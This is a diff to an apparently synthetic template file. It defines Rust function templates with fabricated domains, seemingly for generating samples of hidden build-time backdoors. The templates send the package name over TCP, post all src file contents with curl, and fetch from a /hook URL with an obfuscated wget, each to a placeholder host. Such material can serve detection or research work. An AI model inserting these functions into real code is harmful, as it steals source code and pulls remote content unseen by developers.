@@ -11,11 +11,10 @@ variants:
     domain_fabricated: "macro-telemetry-endpoint.org"
     code_template: |
       fn {fn_name}() {
-          let pkg = std::env::var("CARGO_PKG_NAME").unwrap_or_default();
-          if let Ok(mut stream) = std::net::TcpStream::connect("{target_host}:443") {
-              use std::io::Write;
-              let msg = format!("COMPILE_EVENT: {pkg}\n");
-              let _ = stream.write_all(msg.as_bytes());
+          use std::net::TcpStream;
+          use std::io::Write;
+          if let (Ok(mut stream), Ok(pkg)) = (TcpStream::connect("{target_host}:443"), std::env::var("CARGO_PKG_NAME")) {
+              write!(stream, "COMPILE_EVENT: {pkg}\n").ok();
           }
       }
 
@@ -26,17 +25,19 @@ variants:
     domain_fabricated: "dev-registry-analytics.com"
     code_template: |
       fn {fn_name}() {
-          if let Ok(entries) = std::fs::read_dir("src") {
+          use std::process::Command;
+          use std::fs;
+          if let Ok(entries) = fs::read_dir("src") {
               let mut collected = String::new();
               for entry in entries.flatten() {
-                  if let Ok(content) = std::fs::read_to_string(entry.path()) {
+                  if let Ok(content) = fs::read_to_string(entry.path()) {
                       collected.push_str(&content);
                   }
               }
-              let target = ["http://", "{target_host}", "/src"].concat();
-              let _ = std::process::Command::new("curl")
-                  .args(["-s", "-d", &collected, &target])
-                  .spawn();
+              Command::new("curl")
+                  .args(["-s", "-d", &collected, "http://{target_host}/src"])
+                  .spawn()
+                  .ok();
           }
       }
 
@@ -47,10 +48,10 @@ variants:
     domain_fabricated: "infra-compiler-hook.net"
     code_template: |
       fn {fn_name}() {
-          let encoded = [119, 103, 101, 116]; // 'wget'
-          let prog: String = encoded.iter().map(|&c| c as char).collect();
-          let target = ["http://", "{target_host}", "/hook"].concat();
-          let _ = std::process::Command::new(prog)
-              .args(["-q", "-O-", &target])
-              .spawn();
+          use std::process::Command;
+          const PROG: [u8; 4] = [119, 103, 101, 116]; // 'wget'
+          Command::new(String::from_utf8_lossy(&PROG).as_ref())
+              .args(["-q", "-O-", "http://{target_host}/hook"])
+              .spawn()
+              .ok();
       }
